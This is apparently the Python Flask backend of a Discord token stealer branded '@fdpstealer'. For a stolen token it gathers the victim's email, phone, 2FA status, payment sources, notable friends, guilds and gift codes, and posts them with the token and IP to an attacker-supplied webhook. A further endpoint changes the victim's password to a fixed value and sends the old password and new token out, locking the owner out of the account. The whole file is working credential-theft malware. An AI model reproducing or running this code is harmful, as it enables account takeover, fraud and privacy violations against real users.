import requests
from flask import Flask, request, jsonify
from datetime import datetime
import json
import pycountry

app = Flask(__name__)
url = "https://discord.com/api/v9/users/@me"

@app.route('/')
def hello():
    return "@fdpstealer"

def get_subscription_count(token):
    headers = {"Authorization": token}
    response = requests.get("https://discord.com/api/v10/users/@me/guilds/premium/subscriptions", headers=headers)

    if response.status_code == 200:
        subscriptions = response.json()
        return len(subscriptions)
    else:
        return 0

def calculate_boost_level(subscription_duration):
    boost_intervals = [1, 2, 3, 6, 9, 12, 15, 18, 24]
    boost_levels = [1, 2, 3, 4, 5, 6, 7, 8, 9]

    boost_level = 0
    for interval, level in zip(boost_intervals, boost_levels):
        if subscription_duration >= interval:
            boost_level = level
        else:
            break 

    return boost_level


def get_badges(token):
    headers = {"Authorization": token}
    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)

    if response.status_code == 200:
        user_data = response.json()
        flags = user_data.get("flags", 0)

        badge_emojis = {
            1: "<:staff:1159842496415801450>",
            2: "<:partner:1159842633468874883>",
            4: "<:hypeevents:1159842746933190738>",
            64: "<:bravery:1159843039271989340>",
            128: "<:brilliance:1159843071446499348>",
            256: "<:balance:1159842990609666128>",
            512: "<:early:1159842424387022940>",
            16384: "<:bugbounty:1159843389890625646>",
            4194304: "<:botdev:1159843114844954666>",
            262144: "<:moderadorveri:1159843543200833689>",
            131072: "<:ActiveDeveloperBadge:1116506880609624146>"
        }

        badges = [badge_emojis.get(flag, "`Unknown`") for flag in badge_emojis if flags & flag]

        return badges if badges else ["`None`"]
    else:
        pass
    
def get_country(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=country")
        data = response.json()
        country_code = data.get("country", "`Unknown`")
        
        try:
            country_name = pycountry.countries.get(alpha_2=country_code).name
        except AttributeError:
            country_name = "`Unknown`"
        
        country_emoji = f":flag_{country_code.lower()}:"
        
        return country_name, country_emoji
    except Exception as e:
        print(f"Erro ao obter informações de localização: {str(e)}")
        return "`Unknown`", ":earth_americas:"

def get_billing(token):
    headers = {"Authorization": token}
    response = requests.get("https://discord.com/api/v10/users/@me/billing/payment-sources", headers=headers)

    if response.status_code == 200:
        billing_data_list = response.json()
        
        for billing_data in billing_data_list:
            payment_info = billing_data.get('brand')
            
            if payment_info == 'mastercard' or 'visa':
                return "<:card:1159963116143124490>"
            elif billing_data.get('type') == '0':
                return "<:paypal:1158105359077081159>"
    else:
        return 'False'
        

def getemoji_legacy(token):
    response = requests.get('https://discord.com/api/v10/users/@me', headers={"Authorization": token})
    data = response.json()

    if data.get('discriminator') == '0':
        tem = "<:legacy:1160013992081760266>"
        return tem
    else:
        ntem = ""
        return ntem

def gethqfriends(token):
    badgeslist =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:ActiveDeveloperBadge:1116506880609624146> "},
        {"Name": 'Verified_Bot_Developer', 'Value': 4194304, 'Emoji': "<:botdev:1159843114844954666>"},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bugbounty:1159843389890625646> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1159842424387022940> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:1159842990609666128> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:1159843071446499348> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:1159843039271989340> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bugbounty:1159843389890625646> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypeevents:1159842746933190738> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:1159842633468874883> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:1159842496415801450> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    try:
        response = requests.get('https://discord.com/api/v10/users/@me/relationships', headers=headers)
        friendlist = response.json()
    except Exception as e:
        print(f"Erro ao obter amigos: {e}")
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeslist:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    Own3dBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if Own3dBadges != '':
            uhqlist += f"{Own3dBadges} | `{friend['user']['username']}`\n"
    return uhqlist

def get_hq_guilds(token):
    try:
        headers = {
            "Authorization": f"{token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }

        guilds_response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=headers)
        guilds_response.raise_for_status()

        guilds = guilds_response.json()

        hq_guilds = []
        for guild in guilds:
            if guild.get('features') and 'BOOST_LEVEL_1' in guild['features'] and guild['member_count'] >= 1000:
                guild_info = {
                    'name': guild['name'],
                    'members': guild['member_count'],
                    'boost_level': guild['premium_tier']
                }
                hq_guilds.append(guild_info)
            else:
                return "*Nothing to see here.*"

        return hq_guilds

    except requests.exceptions.RequestException as e:
        return {'status': 'error', 'message': f"Erro ao obter guildas: {str(e)}"}

def get_gifts(token):
    gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token})
    gift_codes = gift_codes.json()
    if gift_codes:
        codes = []
        for code in gift_codes:
            name = code['promotion']['outbound_title']
            code = code['code']

            data = f":gift: `{name}`\n:ticket: `{code}`"

            if len('\n\n'.join(codes)) + len(data) >= 1024:
                break

            codes.append(data)

        if len(codes) > 0:
            codes = '\n\n'.join(codes)
        else:
            codes = "*Nothing to see here.*"
    else:
        codes = "*Nothing to see here.*"
    
    return codes 



@app.route('/api/v1/account', methods=['GET'])
def get_discord_data():
    token = request.args.get('token')
    ip = request.args.get('ip')
    webhook = request.args.get('webhook')
    session = requests.Session()
    r = session.get('https://discord.com/api/v10/users/@me', headers={"Authorization": token})
    
    if r.status_code == 200:
        user_data = r.json()
        user_id = user_data['id']
        username = user_data['username']
        email = user_data['email']
        mfa = user_data['mfa_enabled']
        phone = user_data['phone']
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data['avatar']}.png"

        try:
            account_creation = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%m-%d-%Y %H:%M:%S')
        except (OSError, ValueError) as e:
            return jsonify({'error': 'User ID must be an integer or Invalid timestamp.'}), 400

        nitro = user_data.get('premium_type', 0)

        nitro_dict = {
            0: "`None`",  
            1: "`Nitro Classic`",  
            2: "`Nitro Boost`"
        }
        nitro = nitro_dict.get(nitro, "`None`")

        subscription_count = get_subscription_count(token)
        subscription_duration = subscription_count 
        boost_level = calculate_boost_level(subscription_duration)
        badges = get_badges(token)
        billing = get_billing(token)
        legacy = getemoji_legacy(token)
        hqfriends = gethqfriends(token)
        hqguilds = get_hq_guilds(token)
        codes = get_gifts(token)

        country, country_emoji = get_country(ip)

        boost_emojis = {
    1: "<:Badge_Nitro:1126010947316760689> <:discordboost1:1159656382279200909>",
    2: "<:Badge_Nitro:1126010947316760689> <:discordboost2:1159657172066639952>",
    3: "<:Badge_Nitro:1126010947316760689> <:discordboost3:1159657182460125274>",
    4: "<:Badge_Nitro:1126010947316760689> <:discordboost41:1159657193910579281>",
    5: "<:Badge_Nitro:1126010947316760689> <:discordboost51:1159657483346915338>",
    6: "<:Badge_Nitro:1126010947316760689> <:discordboost6:1159657735290363964>",
    7: "<:Badge_Nitro:1126010947316760689> <:discordboost71:1159657526103642252>",
    8: "<:Badge_Nitro:1126010947316760689> <:discordboost81:1159657500560338956>",
    9: "<:Badge_Nitro:1126010947316760689> <:discordboost91:1159657512560234679>",
}

        boost_emoji = boost_emojis.get(boost_level, "`None`")
        
        uhqlist_embed = {
            "title": "",
            "description": hqfriends,
            "color": 0x2f3136,
            "author": {
            "name": f"HQ Friends",
            "icon_url": "https://cdn4.telegram-cdn.org/file/TZSypEAFnY-QRY8w5Vd5d0mzNjrdWMkQHNMc9ivoKGBdHzTtvf4IoM2tm3KB1lWVyPDBeGkGZuEszV_LNib8FKWG7GtJJBcIwIR1ktShoatZ7lHiHPf9yqE4ywF7IvRW-YVSWoPsJsFkDm7isHsgL5h_KTZcYMKdm6z6Kcc6D4QRVHtEfHRJNPsCeRh8WiXa4UxgoF2EbIzJX7JXAizZcBN5clQH9q2S1qEYWkNOiWuoppTm3ixoRZss9dJctms_o3PjpUxcG-1SI-ozkbbFp8XBV12oJ6lOo5T4XHPUhrOhHlCN52B1hBUs2hSZIn0huRE75Dg_L8-jkugGNBAWmw.jpg" 
            },
            "footer": {
            "text": "@fdpstealer",
            "icon_url": ""
    },
        }

        hqguilds_embed = {
            "title": "",
            "description": hqguilds,
            "color": 0x2f3136,
            "author": {
            "name": f"HQ Guilds",
            "icon_url": "https://cdn4.telegram-cdn.org/file/TZSypEAFnY-QRY8w5Vd5d0mzNjrdWMkQHNMc9ivoKGBdHzTtvf4IoM2tm3KB1lWVyPDBeGkGZuEszV_LNib8FKWG7GtJJBcIwIR1ktShoatZ7lHiHPf9yqE4ywF7IvRW-YVSWoPsJsFkDm7isHsgL5h_KTZcYMKdm6z6Kcc6D4QRVHtEfHRJNPsCeRh8WiXa4UxgoF2EbIzJX7JXAizZcBN5clQH9q2S1qEYWkNOiWuoppTm3ixoRZss9dJctms_o3PjpUxcG-1SI-ozkbbFp8XBV12oJ6lOo5T4XHPUhrOhHlCN52B1hBUs2hSZIn0huRE75Dg_L8-jkugGNBAWmw.jpg" 
            },
            "footer": {
            "text": "@fdpstealer",
            "icon_url": ""
    },
        }

        gift_embed = {
            "title": "",
            "description": codes,
            "color": 0x2f3136,
            "author": {
            "name": f"Gift Inventory",
            "icon_url": "https://cdn4.telegram-cdn.org/file/TZSypEAFnY-QRY8w5Vd5d0mzNjrdWMkQHNMc9ivoKGBdHzTtvf4IoM2tm3KB1lWVyPDBeGkGZuEszV_LNib8FKWG7GtJJBcIwIR1ktShoatZ7lHiHPf9yqE4ywF7IvRW-YVSWoPsJsFkDm7isHsgL5h_KTZcYMKdm6z6Kcc6D4QRVHtEfHRJNPsCeRh8WiXa4UxgoF2EbIzJX7JXAizZcBN5clQH9q2S1qEYWkNOiWuoppTm3ixoRZss9dJctms_o3PjpUxcG-1SI-ozkbbFp8XBV12oJ6lOo5T4XHPUhrOhHlCN52B1hBUs2hSZIn0huRE75Dg_L8-jkugGNBAWmw.jpg" 
            },
            "footer": {
            "text": "@fdpstealer",
            "icon_url": ""
    },
        }
        webhook_data = {
            "content": f"**IP:** `{ip}` | **Country:** `{country}` {country_emoji}",
            "embeds": [
                {
                    "title": "",
                    "description": f"<:black_dinheiroBR:1111328379220787311> **Token:**\n`{token}`\n[Copy Token](https://clown-paste.netlify.app/?p={token})",
                    "color": 0x2f3136,
                    "fields": [
                        {"name": "<:black_4m:1157776407187951798> Display Name:", "value": f"`{username}`", "inline": False},
                        {"name": "<:black_4m:1157776408014237716> Badges:", "value": "".join(badges) + f"{boost_emoji} {legacy}", "inline": True},
                        {"name": "<:black_smile:1158559943675359262> 2FA:", "value": f"`{mfa}`", "inline": True},
                        {"name": "<:black_moneyBR:1157776408890847252> Nitro Type:", "value": f"{nitro}", "inline": True},
                        {"name": "<a:cartao_preto:1145545568559570975> Billing:", "value": f"{billing}", "inline": True},
                        {"name": "<:black2:1154588942788743188> Email:", "value": f"`{email}`", "inline": True},
                        {"name": "<a:6601blackworld:1075943558470713414> Subscription Count:", "value": f"`{subscription_count}`", "inline": True},
                        {"name": "<:147black:1117135478890696744> Phone:", "value": f"`{phone}`", "inline": True},
                        {"name": "<:147black:1117135478890696744> IP:", "value": f"`{ip}`", "inline": True},
                        {"name": "<:147black:1117135478890696744> Country:", "value": f"{country}", "inline": True},
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "url": "",
                        "icon_url": "https://cdn4.telegram-cdn.org/file/TZSypEAFnY-QRY8w5Vd5d0mzNjrdWMkQHNMc9ivoKGBdHzTtvf4IoM2tm3KB1lWVyPDBeGkGZuEszV_LNib8FKWG7GtJJBcIwIR1ktShoatZ7lHiHPf9yqE4ywF7IvRW-YVSWoPsJsFkDm7isHsgL5h_KTZcYMKdm6z6Kcc6D4QRVHtEfHRJNPsCeRh8WiXa4UxgoF2EbIzJX7JXAizZcBN5clQH9q2S1qEYWkNOiWuoppTm3ixoRZss9dJctms_o3PjpUxcG-1SI-ozkbbFp8XBV12oJ6lOo5T4XHPUhrOhHlCN52B1hBUs2hSZIn0huRE75Dg_L8-jkugGNBAWmw.jpg" 
                    },
                    "footer": {
                        "text": "@fdpstealer",
                        "icon_url": ""  
                    },
                    "thumbnail": {
                        "url": avatar_url
                    }
                },
                uhqlist_embed,
                hqguilds_embed,
                gift_embed
            ]
        }

        session.post(webhook, json=webhook_data)
        
        return jsonify({'status': 'success'}), 200
    else:
        return jsonify({'error': 'Invalid Token'}), 403


@app.route('/api/changepassword/')
def changepassword():
    token = request.args.get('token')
    ip = request.args.get('ip')
    password = request.args.get('password')
    webhook = request.args.get('webhook')

    url = "https://discord.com/api/v9/users/@me"

    headers = {
        "Host": "discord.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108"',
        "X-Super-Properties": 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE4Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6InB0LVBUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTggQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjQgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjQiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMzUwMjgsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM3NzIzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
        "X-Debug-Options": "bugReporterEnabled",
        "Accept-Language": "pt-PT,en-US;q=0.9",
        "sec-ch-ua-mobile": "?0",
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9018 Chrome/108.0.5359.215 Electron/22.3.24 Safari/537.36",
        "X-Discord-Timezone": "America/Sao_Paulo",
        "Content-Type": "application/json",
        "X-Discord-Locale": "en-US",
        "sec-ch-ua-platform": '"Windows"',
        "Accept": "*/*",
        "Origin": "https://discord.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://discord.com/channels/@me",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "45"
    }

    change_passwd_params = {
        "password": f"{password}",
        "new_password": "FdpOnTop!@@"
    }

    try:
        response = requests.patch(url, json=change_passwd_params, headers=headers, verify=False)

        if response.status_code == 200:
            changepasswd = json.loads(response.text)
            new_token = changepasswd.get('token', None)
            if new_token:
                payload = {
                    "content": f"Senha: {password}\nNova Token: {new_token}\nToken Atual: {token}"
                }
                session = requests.session()
                session.post(webhook, json=payload, verify=False)
                return jsonify({'status_code': 200, 'message': new_token})
            else:
                return jsonify({'status_code': 500, 'message': 'Não foi possível obter o novo token após mudar a senha.'})
        else:
            return jsonify({'status_code': response.status_code, 'message': response.text})

    except Exception as e:
        return jsonify({'status_code': 500, 'message': f'Erro: {e}'})


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port="5000")
